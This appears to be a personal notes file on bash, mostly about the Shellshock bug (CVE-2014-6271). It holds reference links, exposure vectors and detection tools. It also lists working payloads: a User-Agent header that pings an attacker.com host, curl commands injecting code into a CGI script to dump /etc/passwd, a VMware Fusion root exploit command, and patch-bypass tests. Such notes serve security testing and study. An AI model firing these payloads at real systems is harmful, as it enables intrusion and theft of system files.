# bash

# pitfalls
http://bash.cumulonim.biz/BashPitfalls.html

# shellshock/bashbug CVE-2014-6271
- http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29
- https://shellshocker.net/
- https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
- http://lcamtuf.blogspot.com.es/2014/09/quick-notes-about-bash-bug-its-impact.html
- http://www.dwheeler.com/essays/shellshock.html#timeline
This means that web apps written in languages such as PHP, Python, C++, or Java, are likely to be vulnerable if they ever use libcalls such as popen() or system(), all of which are backed by calls to /bin/sh -c '...'. There is also some added web-level exposure through #!/bin/sh CGI scripts, <!--#exec cmd="..."> calls in SSI, and possibly more exotic vectors such as mod_ext_filter.
For the same reason, userland DHCP clients that invoke configuration scripts and use variables to pass down config details are at risk when exposed to rogue servers (e.g., on open wifi). Finally, there is some exposure for environments that use restricted SSH shells (possibly including Git) or restricted sudo commands, but the security of such approaches is typically fairly modest to begin with.

* detection
https://github.com/hannob/bashcheck
https://github.com/mubix/shellshocker-pocs

() { :;};echo;echo blah;/bin/ls

http-shellshock.nse:
() { :;}; echo; echo blah // in User-Agent, Referrer, Cookie, payload: payload and custom header
nikto_shellshock.plugin:
() { _; } >_[$($())] { echo Nikto-Added-CVE-2014-6278: true; echo;echo; }
() { :; }; echo Nikto-Added-CVE-2014-6271: true;echo;echo;

+ snippets
env x='() { :;}; echo vuln' bash -c "thiscommanddoesntexist"
ssh -o 'rsaauthentication yes’ 192.168.1.1 '() { ignored; }; id'
User-Agent: () { :;}; ping bbug.d2t.attacker.com

+ bashbug scenarios
* http cgi
curl -A '() { :;};echo;/bin/cat /etc/passwd' http://192.168.0.1/poc.cgi
curl -A '() { :;};/bin/cat /etc/passwd>dumped_file' http://192.168.0.1/poc.cgi # if STDOUT doesnt work

* DHCP
https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/

* VMware Fusion
LANG='() { :;}; touch /tmp/it_worked' '/Applications/VMware Fusion.app/Contents/Library/Open VMware Fusion Services'
or
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/osx/local/vmware_bash_function_root.rb

Mac OS X Remote Login
Cisco NX-OS

* DoS
Cookie: () { oops # will generate error message in log

* Incomplete Patch by taviso (patch only prevents RCE)
http://www.openwall.com/lists/oss-security/2014/09/24/40
Ubuntu/Fedora are still vuln: `env X='() { (a)=>\' bash -c "echo echo vuln"; [[ "$(cat echo)" == "vuln" ]] && echo "still vulnerable :("`

